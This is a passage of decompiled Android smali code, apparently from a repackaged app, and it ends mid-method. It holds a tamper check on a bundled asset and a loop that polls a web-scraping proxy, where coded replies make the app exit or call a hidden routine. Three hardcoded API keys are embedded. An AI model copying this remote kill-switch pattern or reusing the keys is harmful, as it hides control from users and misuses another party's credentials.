.class Lcom/start$1;
.super Ljava/lang/Object;
.source "start.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/start;->a(Landroid/content/Context;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic val$context:Landroid/content/Context;


# direct methods
.method constructor <init>(Landroid/content/Context;)V
    .locals 0

    .prologue
    .line 19
    iput-object p1, p0, Lcom/start$1;->val$context:Landroid/content/Context;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 39

    .prologue
    .line 22
    :try_start_0
    new-instance v13, Ljava/io/File;

    new-instance v36, Ljava/lang/StringBuilder;

    invoke-direct/range {v36 .. v36}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/start$1;->val$context:Landroid/content/Context;

    move-object/from16 v37, v0

    invoke-virtual/range {v37 .. v37}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v37

    invoke-virtual/range {v36 .. v37}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v36

    const-string v37, "/dtrhc.txt"

    invoke-virtual/range {v36 .. v37}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v36

    invoke-virtual/range {v36 .. v36}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v36

    move-object/from16 v0, v36

    invoke-direct {v13, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 23
    .local v13, "f1":Ljava/io/File;
    invoke-virtual {v13}, Ljava/io/File;->exists()Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_1

    move-result v36

    if-nez v36, :cond_5

    .line 24
    :try_start_1
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/start$1;->val$context:Landroid/content/Context;

    move-object/from16 v36, v0

    invoke-virtual/range {v36 .. v36}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v36

    const-string v37, "dtrhc.txt"

    invoke-virtual/range {v36 .. v37}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_5
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_1

    move-result-object v21

    .line 25
    .local v21, "is1":Ljava/io/InputStream;
    :try_start_2
    new-instance v26, Ljava/io/FileOutputStream;

    move-object/from16 v0, v26

    invoke-direct {v0, v13}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_3
    .catch Ljava/lang/Throwable; {:try_start_2 .. :try_end_2} :catch_4

    .line 26
    .local v26, "os1":Ljava/io/OutputStream;
    :try_start_3
    invoke-virtual/range {v21 .. v21}, Ljava/io/InputStream;->available()I

    move-result v16

    .line 27
    .local v16, "i1":I
    move/from16 v0, v16

    new-array v2, v0, [B

    .line 28
    .local v2, "b1":[B
    move-object/from16 v0, v21

    invoke-virtual {v0, v2}, Ljava/io/InputStream;->read([B)I

    .line 29
    move-object/from16 v0, v26

    invoke-virtual {v0, v2}, Ljava/io/OutputStream;->write([B)V
    :try_end_3
    .catch Ljava/lang/Throwable; {:try_start_3 .. :try_end_3} :catch_2
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    .line 30
    :try_start_4
    invoke-virtual/range {v26 .. v26}, Ljava/io/OutputStream;->close()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_3
    .catch Ljava/lang/Throwable; {:try_start_4 .. :try_end_4} :catch_4

    .line 33
    .end local v2    # "b1":[B
    .end local v16    # "i1":I
    .end local v26    # "os1":Ljava/io/OutputStream;
    :goto_0
    if-eqz v21, :cond_0

    :try_start_5
    invoke-virtual/range {v21 .. v21}, Ljava/io/InputStream;->close()V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_5
    .catch Ljava/lang/Throwable; {:try_start_5 .. :try_end_5} :catch_1

    .line 60
    .end local v21    # "is1":Ljava/io/InputStream;
    :cond_0
    :goto_1
    :try_start_6
    new-instance v14, Ljava/io/File;

    new-instance v36, Ljava/lang/StringBuilder;

    invoke-direct/range {v36 .. v36}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/start$1;->val$context:Landroid/content/Context;

    move-object/from16 v37, v0

    invoke-virtual/range {v37 .. v37}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v37

    invoke-virtual/range {v36 .. v37}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v36

    const-string v37, "/ffdtr.dat"

    invoke-virtual/range {v36 .. v37}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v36

    invoke-virtual/range {v36 .. v36}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v36

    move-object/from16 v0, v36

    invoke-direct {v14, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 61
    .local v14, "f2":Ljava/io/File;
    invoke-virtual {v14}, Ljava/io/File;->exists()Z

    move-result v36

    if-nez v36, :cond_3

    .line 62
    const-string v31, ""
    :try_end_6
    .catch Ljava/lang/Throwable; {:try_start_6 .. :try_end_6} :catch_1

    .line 63
    .local v31, "s3":Ljava/lang/String;
    :try_start_7
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/start$1;->val$context:Landroid/content/Context;

    move-object/from16 v36, v0

    invoke-virtual/range {v36 .. v36}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v36

    const-string v37, "ccwc.txt"

    invoke-virtual/range {v36 .. v37}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_f
    .catch Ljava/lang/Throwable; {:try_start_7 .. :try_end_7} :catch_1

    move-result-object v24

    .line 64
    .local v24, "is4":Ljava/io/InputStream;
    :try_start_8
    invoke-virtual/range {v24 .. v24}, Ljava/io/InputStream;->available()I

    move-result v19

    .line 65
    .local v19, "i4":I
    move/from16 v0, v19

    new-array v5, v0, [B

    .line 66
    .local v5, "b4":[B
    move-object/from16 v0, v24

    invoke-virtual {v0, v5}, Ljava/io/InputStream;->read([B)I

    .line 67
    new-instance v32, Ljava/lang/String;

    move-object/from16 v0, v32

    invoke-direct {v0, v5}, Ljava/lang/String;-><init>([B)V
    :try_end_8
    .catch Ljava/lang/Throwable; {:try_start_8 .. :try_end_8} :catch_e
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_f

    .line 68
    .end local v31    # "s3":Ljava/lang/String;
    .local v32, "s3":Ljava/lang/String;
    if-eqz v24, :cond_1

    :try_start_9
    invoke-virtual/range {v24 .. v24}, Ljava/io/InputStream;->close()V
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_11
    .catch Ljava/lang/Throwable; {:try_start_9 .. :try_end_9} :catch_1

    :cond_1
    move-object/from16 v31, v32

    .line 71
    .end local v5    # "b4":[B
    .end local v19    # "i4":I
    .end local v24    # "is4":Ljava/io/InputStream;
    .end local v32    # "s3":Ljava/lang/String;
    .restart local v31    # "s3":Ljava/lang/String;
    :goto_2
    const/16 v20, 0x0

    .line 73
    .local v20, "i5":I
    :cond_2
    :goto_3
    const/4 v15, 0x0

    .line 74
    .local v15, "huc1":Ljava/net/HttpURLConnection;
    const/16 v36, 0x3

    :try_start_a
    move/from16 v0, v36

    new-array v0, v0, [Ljava/lang/String;

    move-object/from16 v25, v0

    const/16 v36, 0x0

    const-string v37, "fbd30ba0-56be-11ec-9fc5-07d4cf167e6b"

    aput-object v37, v25, v36

    const/16 v36, 0x1

    const-string v37, "739ddd40-56c4-11ec-83af-4306261ca458"

    aput-object v37, v25, v36

    const/16 v36, 0x2

    const-string v37, "b75ec5a0-6cc4-11ed-a0cb-091459b18d32"

    aput-object v37, v25, v36
    :try_end_a
    .catch Ljava/lang/Throwable; {:try_start_a .. :try_end_a} :catch_1

    .line 76
    .local v25, "k1":[Ljava/lang/String;
    :try_start_b
    new-instance v36, Ljava/net/URL;

    new-instance v37, Ljava/lang/StringBuilder;

    invoke-direct/range {v37 .. v37}, Ljava/lang/StringBuilder;-><init>()V

    const-string v38, "https://app.zenscrape.com/api/v1/get?&url=http://localhost/start/"

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    move-object/from16 v0, v37

    move-object/from16 v1, v31

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    const-string v38, "&location=eu"

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    invoke-virtual/range {v37 .. v37}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v37

    invoke-direct/range {v36 .. v37}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual/range {v36 .. v36}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v36

    move-object/from16 v0, v36

    check-cast v0, Ljava/net/HttpURLConnection;

    move-object v15, v0

    .line 77
    const-string v36, "apikey"

    new-instance v37, Ljava/util/Random;

    invoke-direct/range {v37 .. v37}, Ljava/util/Random;-><init>()V

    move-object/from16 v0, v25

    array-length v0, v0

    move/from16 v38, v0

    invoke-virtual/range {v37 .. v38}, Ljava/util/Random;->nextInt(I)I

    move-result v37

    aget-object v37, v25, v37

    move-object/from16 v0, v36

    move-object/from16 v1, v37

    invoke-virtual {v15, v0, v1}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 78
    invoke-virtual {v15}, Ljava/net/HttpURLConnection;->connect()V

    .line 79
    new-instance v34, Ljava/lang/StringBuilder;

    invoke-direct/range {v34 .. v34}, Ljava/lang/StringBuilder;-><init>()V

    .line 80
    .local v34, "sb1":Ljava/lang/StringBuilder;
    new-instance v6, Ljava/io/BufferedReader;

    new-instance v36, Ljava/io/InputStreamReader;

    invoke-virtual {v15}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v37

    invoke-direct/range {v36 .. v37}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    move-object/from16 v0, v36

    invoke-direct {v6, v0}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 82
    .local v6, "br1":Ljava/io/BufferedReader;
    :goto_4
    invoke-virtual {v6}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v33

    .local v33, "s4":Ljava/lang/String;
    if-eqz v33, :cond_9

    .line 83
    move-object/from16 v0, v34

    move-object/from16 v1, v33

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_0
    .catchall {:try_start_b .. :try_end_b} :catchall_0

    goto :goto_4

    .line 96
    .end local v6    # "br1":Ljava/io/BufferedReader;
    .end local v33    # "s4":Ljava/lang/String;
    .end local v34    # "sb1":Ljava/lang/StringBuilder;
    :catch_0
    move-exception v12

    .line 97
    .local v12, "e6":Ljava/lang/Exception;
    const/16 v36, 0x3c

    move/from16 v0, v20

    move/from16 v1, v36

    if-lt v0, v1, :cond_d

    .line 98
    const/16 v36, 0x0

    :try_start_c
    invoke-static/range {v36 .. v36}, Ljava/lang/System;->exit(I)V
    :try_end_c
    .catchall {:try_start_c .. :try_end_c} :catchall_0

    .line 104
    :goto_5
    if-eqz v15, :cond_2

    .line 105
    :try_start_d
    invoke-virtual {v15}, Ljava/net/HttpURLConnection;->disconnect()V
    :try_end_d
    .catch Ljava/lang/Throwable; {:try_start_d .. :try_end_d} :catch_1

    goto/16 :goto_3

    .line 110
    .end local v12    # "e6":Ljava/lang/Exception;
    .end local v13    # "f1":Ljava/io/File;
    .end local v14    # "f2":Ljava/io/File;
    .end local v15    # "huc1":Ljava/net/HttpURLConnection;
    .end local v20    # "i5":I
    .end local v25    # "k1":[Ljava/lang/String;
    .end local v31    # "s3":Ljava/lang/String;
    :catch_1
    move-exception v35

    .line 111
    .local v35, "th1":Ljava/lang/Throwable;
    invoke-virtual/range {v35 .. v35}, Ljava/lang/Throwable;->printStackTrace()V

    .line 113
    .end local v35    # "th1":Ljava/lang/Throwable;
    :cond_3
    :goto_6
    return-void

    .line 25
    .restart local v13    # "f1":Ljava/io/File;
    .restart local v21    # "is1":Ljava/io/InputStream;
    .restart local v26    # "os1":Ljava/io/OutputStream;
    :catch_2
    move-exception v36

    :try_start_e
    invoke-virtual/range {v26 .. v26}, Ljava/io/OutputStream;->close()V
    :try_end_e
    .catch Ljava/lang/Throwable; {:try_start_e .. :try_end_e} :catch_6
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_3

    :goto_7
    :try_start_f
    throw v36
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_3
    .catch Ljava/lang/Throwable; {:try_start_f .. :try_end_f} :catch_4

    .line 30
    .end local v26    # "os1":Ljava/io/OutputStream;
    :catch_3
    move-exception v7

    .line 31
    .local v7, "e1":Ljava/lang/Exception;
    const/16 v36, 0x0

    :try_start_10
    invoke-static/range {v36 .. v36}, Ljava/lang/System;->exit(I)V
    :try_end_10
    .catch Ljava/lang/Throwable; {:try_start_10 .. :try_end_10} :catch_4
    .catch Ljava/lang/Exception; {:try_start_10 .. :try_end_10} :catch_5

    goto/16 :goto_0

    .line 24
    .end local v7    # "e1":Ljava/lang/Exception;
    :catch_4
    move-exception v36

    if-eqz v21, :cond_4

    :try_start_11
    invoke-virtual/range {v21 .. v21}, Ljava/io/InputStream;->close()V
    :try_end_11
    .catch Ljava/lang/Throwable; {:try_start_11 .. :try_end_11} :catch_7
    .catch Ljava/lang/Exception; {:try_start_11 .. :try_end_11} :catch_5

    :cond_4
    :goto_8
    :try_start_12
    throw v36
    :try_end_12
    .catch Ljava/lang/Exception; {:try_start_12 .. :try_end_12} :catch_5
    .catch Ljava/lang/Throwable; {:try_start_12 .. :try_end_12} :catch_1

    .line 33
    .end local v21    # "is1":Ljava/io/InputStream;
    :catch_5
    move-exception v8

    .line 34
    .local v8, "e2":Ljava/lang/Exception;
    const/16 v36, 0x0

    :try_start_13
    invoke-static/range {v36 .. v36}, Ljava/lang/System;->exit(I)V
    :try_end_13
    .catch Ljava/lang/Throwable; {:try_start_13 .. :try_end_13} :catch_1

    goto/16 :goto_1

    .line 25
    .end local v8    # "e2":Ljava/lang/Exception;
    .restart local v21    # "is1":Ljava/io/InputStream;
    .restart local v26    # "os1":Ljava/io/OutputStream;
    :catch_6
    move-exception v37

    :try_start_14
    invoke-virtual/range {v36 .. v37}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V
    :try_end_14
    .catch Ljava/lang/Exception; {:try_start_14 .. :try_end_14} :catch_3
    .catch Ljava/lang/Throwable; {:try_start_14 .. :try_end_14} :catch_4

    goto :goto_7

    .line 24
    .end local v26    # "os1":Ljava/io/OutputStream;
    :catch_7
    move-exception v37

    :try_start_15
    invoke-virtual/range {v36 .. v37}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V
    :try_end_15
    .catch Ljava/lang/Exception; {:try_start_15 .. :try_end_15} :catch_5
    .catch Ljava/lang/Throwable; {:try_start_15 .. :try_end_15} :catch_1

    goto :goto_8

    .line 37
    .end local v21    # "is1":Ljava/io/InputStream;
    :cond_5
    :try_start_16
    const-string v27, ""

    .line 38
    .local v27, "s1":Ljava/lang/String;
    const-string v29, ""
    :try_end_16
    .catch Ljava/lang/Throwable; {:try_start_16 .. :try_end_16} :catch_1

    .line 39
    .local v29, "s2":Ljava/lang/String;
    :try_start_17
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/start$1;->val$context:Landroid/content/Context;

    move-object/from16 v36, v0

    invoke-virtual/range {v36 .. v36}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v36

    const-string v37, "dtrhc.txt"

    invoke-virtual/range {v36 .. v37}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
    :try_end_17
    .catch Ljava/lang/Exception; {:try_start_17 .. :try_end_17} :catch_9
    .catch Ljava/lang/Throwable; {:try_start_17 .. :try_end_17} :catch_1

    move-result-object v22

    .line 40
    .local v22, "is2":Ljava/io/InputStream;
    :try_start_18
    invoke-virtual/range {v22 .. v22}, Ljava/io/InputStream;->available()I

    move-result v17

    .line 41
    .local v17, "i2":I
    move/from16 v0, v17

    new-array v3, v0, [B

    .line 42
    .local v3, "b2":[B
    move-object/from16 v0, v22

    invoke-virtual {v0, v3}, Ljava/io/InputStream;->read([B)I

    .line 43
    new-instance v28, Ljava/lang/String;

    move-object/from16 v0, v28

    invoke-direct {v0, v3}, Ljava/lang/String;-><init>([B)V
    :try_end_18
    .catch Ljava/lang/Throwable; {:try_start_18 .. :try_end_18} :catch_8
    .catch Ljava/lang/Exception; {:try_start_18 .. :try_end_18} :catch_9

    .line 44
    .end local v27    # "s1":Ljava/lang/String;
    .local v28, "s1":Ljava/lang/String;
    if-eqz v22, :cond_6

    :try_start_19
    invoke-virtual/range {v22 .. v22}, Ljava/io/InputStream;->close()V
    :try_end_19
    .catch Ljava/lang/Exception; {:try_start_19 .. :try_end_19} :catch_13
    .catch Ljava/lang/Throwable; {:try_start_19 .. :try_end_19} :catch_1

    :cond_6
    move-object/from16 v27, v28

    .line 47
    .end local v3    # "b2":[B
    .end local v17    # "i2":I
    .end local v22    # "is2":Ljava/io/InputStream;
    .end local v28    # "s1":Ljava/lang/String;
    .restart local v27    # "s1":Ljava/lang/String;
    :goto_9
    :try_start_1a
    new-instance v23, Ljava/io/FileInputStream;

    move-object/from16 v0, v23

    invoke-direct {v0, v13}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V
    :try_end_1a
    .catch Ljava/lang/Exception; {:try_start_1a .. :try_end_1a} :catch_c
    .catch Ljava/lang/Throwable; {:try_start_1a .. :try_end_1a} :catch_1

    .line 48
    .local v23, "is3":Ljava/io/InputStream;
    :try_start_1b
    invoke-virtual/range {v23 .. v23}, Ljava/io/InputStream;->available()I

    move-result v18

    .line 49
    .local v18, "i3":I
    move/from16 v0, v18

    new-array v4, v0, [B

    .line 50
    .local v4, "b3":[B
    move-object/from16 v0, v23

    invoke-virtual {v0, v4}, Ljava/io/InputStream;->read([B)I

    .line 51
    new-instance v30, Ljava/lang/String;

    move-object/from16 v0, v30

    invoke-direct {v0, v4}, Ljava/lang/String;-><init>([B)V
    :try_end_1b
    .catch Ljava/lang/Throwable; {:try_start_1b .. :try_end_1b} :catch_b
    .catch Ljava/lang/Exception; {:try_start_1b .. :try_end_1b} :catch_c

    .line 52
    .end local v29    # "s2":Ljava/lang/String;
    .local v30, "s2":Ljava/lang/String;
    :try_start_1c
    invoke-virtual/range {v23 .. v23}, Ljava/io/InputStream;->close()V
    :try_end_1c
    .catch Ljava/lang/Exception; {:try_start_1c .. :try_end_1c} :catch_12
    .catch Ljava/lang/Throwable; {:try_start_1c .. :try_end_1c} :catch_1

    move-object/from16 v29, v30

    .line 55
    .end local v4    # "b3":[B
    .end local v18    # "i3":I
    .end local v23    # "is3":Ljava/io/InputStream;
    .end local v30    # "s2":Ljava/lang/String;
    .restart local v29    # "s2":Ljava/lang/String;
    :goto_a
    :try_start_1d
    move-object/from16 v0, v27

    move-object/from16 v1, v29

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v36

    if-nez v36, :cond_0

    .line 56
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/start$1;->val$context:Landroid/content/Context;

    move-object/from16 v36, v0

    invoke-static/range {v36 .. v36}, Lcom/mlp;->c(Landroid/content/Context;)V

    .line 57
    const/16 v36, 0x0

    invoke-static/range {v36 .. v36}, Ljava/lang/System;->exit(I)V
    :try_end_1d
    .catch Ljava/lang/Throwable; {:try_start_1d .. :try_end_1d} :catch_1

    goto/16 :goto_1

    .line 39
    .restart local v22    # "is2":Ljava/io/InputStream;
    :catch_8
    move-exception v36

    if-eqz v22, :cond_7

    :try_start_1e
    invoke-virtual/range {v22 .. v22}, Ljava/io/InputStream;->close()V
    :try_end_1e
    .catch Ljava/lang/Throwable; {:try_start_1e .. :try_end_1e} :catch_a
    .catch Ljava/lang/Exception; {:try_start_1e .. :try_end_1e} :catch_9

    :cond_7
    :goto_b
    :try_start_1f
    throw v36
    :try_end_1f
    .catch Ljava/lang/Exception; {:try_start_1f .. :try_end_1f} :catch_9
    .catch Ljava/lang/Throwable; {:try_start_1f .. :try_end_1f} :catch_1

    .line 44
    .end local v22    # "is2":Ljava/io/InputStream;
    :catch_9
    move-exception v9

    .line 45
    .local v9, "e3":Ljava/lang/Exception;
    :goto_c
    const/16 v36, 0x0

    :try_start_20
    invoke-static/range {v36 .. v36}, Ljava/lang/System;->exit(I)V
    :try_end_20
    .catch Ljava/lang/Throwable; {:try_start_20 .. :try_end_20} :catch_1

    goto :goto_9

    .line 39
    .end local v9    # "e3":Ljava/lang/Exception;
    .restart local v22    # "is2":Ljava/io/InputStream;
    :catch_a
    move-exception v37

    :try_start_21
    invoke-virtual/range {v36 .. v37}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V
    :try_end_21
    .catch Ljava/lang/Exception; {:try_start_21 .. :try_end_21} :catch_9
    .catch Ljava/lang/Throwable; {:try_start_21 .. :try_end_21} :catch_1

    goto :goto_b

    .line 47
    .end local v22    # "is2":Ljava/io/InputStream;
    .restart local v23    # "is3":Ljava/io/InputStream;
    :catch_b
    move-exception v36

    :try_start_22
    invoke-virtual/range {v23 .. v23}, Ljava/io/InputStream;->close()V
    :try_end_22
    .catch Ljava/lang/Throwable; {:try_start_22 .. :try_end_22} :catch_d
    .catch Ljava/lang/Exception; {:try_start_22 .. :try_end_22} :catch_c

    :goto_d
    :try_start_23
    throw v36
    :try_end_23
    .catch Ljava/lang/Exception; {:try_start_23 .. :try_end_23} :catch_c
    .catch Ljava/lang/Throwable; {:try_start_23 .. :try_end_23} :catch_1

    .line 52
    .end local v23    # "is3":Ljava/io/InputStream;
    :catch_c
    move-exception v10

    .line 53
    .local v10, "e4":Ljava/lang/Exception;
    :goto_e
    const/16 v36, 0x0

    :try_start_24
    invoke-static/range {v36 .. v36}, Ljava/lang/System;->exit(I)V
    :try_end_24
    .catch Ljava/lang/Throwable; {:try_start_24 .. :try_end_24} :catch_1

    goto :goto_a

    .line 47
    .end local v10    # "e4":Ljava/lang/Exception;
    .restart local v23    # "is3":Ljava/io/InputStream;
    :catch_d
    move-exception v37

    :try_start_25
    invoke-virtual/range {v36 .. v37}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V
    :try_end_25
    .catch Ljava/lang/Exception; {:try_start_25 .. :try_end_25} :catch_c
    .catch Ljava/lang/Throwable; {:try_start_25 .. :try_end_25} :catch_1

    goto :goto_d

    .line 63
    .end local v23    # "is3":Ljava/io/InputStream;
    .end local v27    # "s1":Ljava/lang/String;
    .end local v29    # "s2":Ljava/lang/String;
    .restart local v14    # "f2":Ljava/io/File;
    .restart local v24    # "is4":Ljava/io/InputStream;
    .restart local v31    # "s3":Ljava/lang/String;
    :catch_e
    move-exception v36

    if-eqz v24, :cond_8

    :try_start_26
    invoke-virtual/range {v24 .. v24}, Ljava/io/InputStream;->close()V
    :try_end_26
    .catch Ljava/lang/Throwable; {:try_start_26 .. :try_end_26} :catch_10
    .catch Ljava/lang/Exception; {:try_start_26 .. :try_end_26} :catch_f

    :cond_8
    :goto_f
    :try_start_27
    throw v36
    :try_end_27
    .catch Ljava/lang/Exception; {:try_start_27 .. :try_end_27} :catch_f
    .catch Ljava/lang/Throwable; {:try_start_27 .. :try_end_27} :catch_1

    .line 68
    .end local v24    # "is4":Ljava/io/InputStream;
    :catch_f
    move-exception v11

    .line 69
    .local v11, "e5":Ljava/lang/Exception;
    :goto_10
    const/16 v36, 0x0

    :try_start_28
    invoke-static/range {v36 .. v36}, Ljava/lang/System;->exit(I)V
    :try_end_28
    .catch Ljava/lang/Throwable; {:try_start_28 .. :try_end_28} :catch_1

    goto/16 :goto_2

    .line 63
    .end local v11    # "e5":Ljava/lang/Exception;
    .restart local v24    # "is4":Ljava/io/InputStream;
    :catch_10
    move-exception v37

    :try_start_29
    invoke-virtual/range {v36 .. v37}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V
    :try_end_29
    .catch Ljava/lang/Exception; {:try_start_29 .. :try_end_29} :catch_f
    .catch Ljava/lang/Throwable; {:try_start_29 .. :try_end_29} :catch_1

    goto :goto_f

    .line 85
    .end local v24    # "is4":Ljava/io/InputStream;
    .restart local v6    # "br1":Ljava/io/BufferedReader;
    .restart local v15    # "huc1":Ljava/net/HttpURLConnection;
    .restart local v20    # "i5":I
    .restart local v25    # "k1":[Ljava/lang/String;
    .restart local v33    # "s4":Ljava/lang/String;
    .restart local v34    # "sb1":Ljava/lang/StringBuilder;
    :cond_9
    :try_start_2a
    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v36

    const-string v37, "1125"

    invoke-virtual/range {v36 .. v37}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v36

    if-eqz v36, :cond_a

    .line 86
    invoke-virtual {v14}, Ljava/io/File;->createNewFile()Z
    :try_end_2a
    .catch Ljava/lang/Exception; {:try_start_2a .. :try_end_2a} :catch_0
    .catchall {:try_start_2a .. :try_end_2a} :catchall_0

    .line 104
    if-eqz v15, :cond_3

    .line 105
    :try_start_2b
    invoke-virtual {v15}, Ljava/net/HttpURLConnection;->disconnect()V
    :try_end_2b
    .catch Ljava/lang/Throwable; {:try_start_2b .. :try_end_2b} :catch_1

    goto/16 :goto_6

    .line 89
    :cond_a
    :try_start_2c
    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v36

    const-string v37, "1126"

    invoke-virtual/range {v36 .. v37}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v36

    if-eqz v36, :cond_b

    .line 90
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/start$1;->val$context:Landroid/content/Context;

    move-object/from16 v36, v0

    invoke-static/range {v36 .. v36}, Lcom/mlp;->c(Landroid/content/Context;)V

    .line 91
    const/16 v36, 0x0

    invoke-static/range {v36 .. v36}, Ljava/lang/System;->exit(I)V

    .line 93
    :cond_b
    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v36

    const-string v37, "1127"

    invoke-virtual/range {v36 .. v37}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v36

    if-eqz v36, :cond_c

    .line 94
    const/16 v36, 0x0

    invoke-static/range {v36 .. v36}, Ljava/lang/System;->exit(I)V
    :try_end_2c
    .catch Ljava/lang/Exception; {:try_start_2c .. :try_end_2c} :catch_0
    .catchall {:try_start_2c .. :try_end_2c} :catchall_0

    .line 104
    :cond_c
    if-eqz v15, :cond_2

    .line 105
    :try_start_2d
    invoke-virtual {v15}, Ljava/net/HttpURLConnection;->disconnect()V
    :try_end_2d
    .catch Ljava/lang/Throwable; {:try_start_2d .. :try_end_2d} :catch_1

    goto/16 :goto_3

    .line 100
    .end local v6    # "br1":Ljava/io/BufferedReader;
    .end local v33    # "s4":Ljava/lang/String;
    .end local v34    # "sb1":Ljava/lang/StringBuilder;
    .restart local v12    # "e6":Ljava/lang/Exception;
    :cond_d
    add-int/lit8 v20, v20, 0x1

    .line 101
    const-wide/16 v36, 0x3e8

    :try_start_2e
    invoke-static/range {v36 .. v37}, Landroid/os/SystemClock;->sleep(J)V
    :try_end_2e
    .catchall {:try_start_2e .. :try_end_2e} :catchall_0

    goto/16 :goto_5

    .line 104
    .end local v12    # "e6":Ljava/lang/Exception;
    :catchall_0
    move-exception v36

    if-eqz v15, :cond_e

    .line 105
    :try_start_2f
    invoke-virtual {v15}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 107
    :cond_e
    throw v36
    :try_end_2f
    .catch Ljava/lang/Throwable; {:try_start_2f .. :try_end_2f} :catch_1

    .line 68
    .end local v15    # "huc1":Ljava/net/HttpURLConnection;
    .end local v20    # "i5":I
    .end local v25    # "k1":[Ljava/lang/String;
    .end local v31    # "s3":Ljava/lang/String;
    .restart local v5    # "b4":[B
    .restart local v19    # "i4":I
    .restart local v24    # "is4":Ljava/io/InputStream;
    .restart local v32    # "s3":Ljava/lang/String;
    :catch_11
    move-exception v11

    move-object/from16 v31, v32

    .end local v32    # "s3":Ljava/lang/String;
    .restart local v31    # "s3":Ljava/lang/String;
    goto :goto_10

    .line 52
    .end local v5    # "b4":[B
    .end local v14    # "f2":Ljava/io/File;
    .end local v19    # "i4":I
    .end local v24    # "is4":Ljava/io/InputStream;
    .end local v31    # "s3":Ljava/lang/String;
    .restart local v4    # "b3":[B
